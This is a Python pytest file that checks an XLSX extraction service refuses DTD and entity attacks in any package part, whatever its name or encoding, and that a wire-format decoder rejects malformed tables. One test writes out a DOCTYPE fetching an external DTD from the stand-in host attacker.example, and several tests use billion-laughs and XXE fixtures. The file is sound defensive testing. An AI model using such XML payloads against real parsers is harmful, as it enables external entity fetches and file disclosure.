"""Guards the T11 hand-mutation pass found untested (M1 PR 5).

Each test here fails under a mutation of one guard that every earlier test survived:
- `refuse_dtds`: the `.rels` and `.vml` parts are refused too, not only `.xml` ones;
- wire v2: the column cap, an empty row and the count ranges are checked on their own,
  not only through another check that happens to refuse the same reply.

A DTD in an XML part is refused whatever the part is called (the T11 finding, fixed).
"""

import io
import json
import struct
import zipfile
from typing import Any

import pytest

from app.extraction.inputs.limits import MAX_ROWS_READ, MAX_SHEET_COLUMN, MAX_TABLE_COLUMNS
from app.extraction.inputs.wire import WireError, decode
from tests.extraction.inputs.sheets import (
    CT_NS,
    HOSTILE_PROLOGUES,
    NS,
    PKG_REL_NS,
    REL_NS,
    SHEET_CT,
    STRINGS_CT,
    XLSX_MAIN,
    XML_DECL,
    Sheet,
    make_xlsx,
    row,
    shared,
    sheet_xml,
)
from tests.extraction.inputs.test_wire_table import header, table
from tests.extraction.inputs.test_xlsx_hostile import code_of

# --- refuse_dtds: every XML part, whatever its extension says ------------------------------

_RELS = (
    f'<Relationships xmlns="{PKG_REL_NS}">'
    f'<Relationship Id="rId1" Type="{REL_NS}/officeDocument" Target="xl/workbook.xml"/>'
    "</Relationships>"
)
_VML = '<xml xmlns:v="urn:schemas-microsoft-com:vml"><v:shape id="s"/></xml>'


def _with_package_rels(prologue: str) -> bytes:
    # make_xlsx writes `_rels/.rels` itself: rebuild the zip with ours in its place.
    original = make_xlsx()
    out = io.BytesIO()
    with (
        zipfile.ZipFile(io.BytesIO(original)) as source,
        zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as target,
    ):
        for info in source.infolist():
            payload = source.read(info)
            if info.filename == "_rels/.rels":
                payload = (prologue + _RELS).encode()
            target.writestr(info.filename, payload)
    return out.getvalue()


def _with_vml(prologue: str) -> bytes:
    return make_xlsx(extra=[("xl/drawings/vmlDrawing1.vml", prologue + _VML)])


@pytest.mark.parametrize("build", [_with_package_rels, _with_vml], ids=["rels", "vml"])
@pytest.mark.parametrize("attack", sorted(HOSTILE_PROLOGUES))
def test_a_dtd_in_a_rels_or_vml_part_is_invalid(build: Any, attack: str) -> None:
    head, _ = HOSTILE_PROLOGUES[attack]
    assert code_of(build(head)) == "invalid_file"


@pytest.mark.parametrize("build", [_with_package_rels, _with_vml], ids=["rels", "vml"])
def test_the_same_rels_and_vml_parts_without_a_dtd_parse(build: Any) -> None:
    assert code_of(build(XML_DECL)) == "parsed"


def _strings_part_named(name: str, prologue: str) -> bytes:
    """Shared strings at `xl/<name>`: openpyxl finds the part by its content type and the
    workbook relationship, whatever its extension."""
    content_types = (
        f'{XML_DECL}<Types xmlns="{CT_NS}">'
        '<Default Extension="rels" '
        'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        f'<Override PartName="/xl/workbook.xml" ContentType="{XLSX_MAIN}"/>'
        f'<Override PartName="/xl/worksheets/sheet1.xml" ContentType="{SHEET_CT}"/>'
        f'<Override PartName="/xl/{name}" ContentType="{STRINGS_CT}"/>'
        "</Types>"
    )
    rel = f'<Relationship Id="rIdS" Type="{REL_NS}/sharedStrings" Target="{name}"/>'
    strings = f'{prologue}<sst xmlns="{NS}"><si><t>SHARED-OK</t></si></sst>'
    return make_xlsx(
        [Sheet("PO", sheet_xml(row(1, shared("A1", 0))))],
        content_types=content_types,
        workbook_rels_extra=rel,
        extra=[(f"xl/{name}", strings)],
    )


@pytest.mark.parametrize("name", ["sharedStrings.xml", "strings.bin"])
def test_a_shared_strings_part_under_any_name_parses(name: str) -> None:
    assert code_of(_strings_part_named(name, XML_DECL)) == "parsed"


@pytest.mark.parametrize("attack", ["billion_laughs", "quadratic", "xxe_file"])
def test_entities_in_a_part_not_named_xml_are_still_invalid(attack: str) -> None:
    # openpyxl's own defusedxml calls stop entities even where refuse_dtds didn't look.
    head, body = HOSTILE_PROLOGUES[attack]
    data = _strings_part_named("strings.bin", head).replace(b"SHARED-OK", body.encode())
    assert code_of(data) == "invalid_file"


def test_a_dtd_in_a_part_not_named_xml_is_invalid() -> None:
    # T11 finding: parts were chosen by extension; openpyxl finds them by content type.
    head, _ = HOSTILE_PROLOGUES["xxe_dtd"]
    assert code_of(_strings_part_named("strings.bin", head)) == "invalid_file"


@pytest.mark.parametrize("name", ["strings.dat", "STRINGS", "s.XmL.bak", "data/sst"])
@pytest.mark.parametrize("attack", sorted(HOSTILE_PROLOGUES))
def test_a_dtd_in_a_part_declared_with_an_odd_extension_is_invalid(name: str, attack: str) -> None:
    head, _ = HOSTILE_PROLOGUES[attack]
    assert code_of(_strings_part_named(name, head)) == "invalid_file"
    assert code_of(_strings_part_named(name, XML_DECL)) == "parsed"


@pytest.mark.parametrize(
    "encode",
    [
        lambda text: text.encode("utf-16"),  # with a BOM
        lambda text: text.encode("utf-16-le"),
        lambda text: text.encode("utf-16-be"),
        lambda text: b"\xef\xbb\xbf" + text.encode(),  # UTF-8 BOM
        lambda text: b" \r\n\t" * 30_000 + text.encode(),  # whitespace past the first read
    ],
    ids=["utf16-bom", "utf16-le", "utf16-be", "utf8-bom", "leading-space"],
)
def test_a_dtd_is_found_whatever_the_encoding_or_leading_space(encode: Any) -> None:
    doctype = '<!DOCTYPE x SYSTEM "http://attacker.example/evil.dtd"><x/>'
    data = make_xlsx(extra=[("xl/odd.bin", encode(doctype))])
    assert code_of(data) == "invalid_file"


@pytest.mark.parametrize(
    "payload",
    [
        b"\x89PNG\r\n\x1a\n" + b"\0" * 32,
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 32,  # vbaProject.bin (CFB)
        b"\x01\x00\x00\x00EMF",
        b"",
        b"   \n",
        b"plain text, not xml",
    ],
    ids=["png", "cfb", "emf", "empty", "blank", "text"],
)
def test_binary_and_non_xml_parts_are_left_alone(payload: bytes) -> None:
    assert code_of(make_xlsx(extra=[("xl/media/blob.bin", payload)])) == "parsed"


# --- wire v2: each parent check on its own -----------------------------------------------


def frame(value: dict[str, Any]) -> bytes:
    raw = json.dumps(value).encode()
    return struct.pack(">Q", len(raw)) + raw


def _wide(columns: int) -> dict[str, Any]:
    return table(
        columns=list(range(1, columns + 1)),
        rows=[[1, [f"c{i}" for i in range(columns)]]],
    )


def test_the_most_columns_decode() -> None:
    decode(frame(header(table=_wide(MAX_TABLE_COLUMNS))))


@pytest.mark.parametrize(
    "bad",
    [
        # One column over the cap, every row the right width and every column used.
        header(table=_wide(MAX_TABLE_COLUMNS + 1)),
        # An empty row between full ones (every column has data elsewhere).
        header(table=table(rows=[[1, ["a", "b"]], [2, [None, None]], [3, ["c", "d"]]])),
        # Counts out of range even with their warning present.
        header(["hidden_cells_ignored"], table=table(hidden_columns=-1)),
        header(["hidden_cells_ignored"], table=table(hidden_columns=MAX_SHEET_COLUMN + 1)),
        header(["hidden_cells_ignored"], table=table(hidden_rows=-1)),
        header(
            ["hidden_cells_ignored"],
            table=table(hidden_rows=MAX_ROWS_READ * MAX_SHEET_COLUMN + 1),
        ),
        header(["formula_without_value"], table=table(formulas_without_value=-1)),
        header(["hidden_cells_ignored"], table=table(hidden_rows=True)),
    ],
    ids=[
        "too_many_columns",
        "empty_row",
        "negative_hidden_columns",
        "too_many_hidden_columns",
        "negative_hidden_rows",
        "too_many_hidden_rows",
        "negative_formulas",
        "boolean_count",
    ],
)
def test_each_table_check_refuses_on_its_own(bad: dict[str, Any]) -> None:
    with pytest.raises(WireError):
        decode(frame(bad))
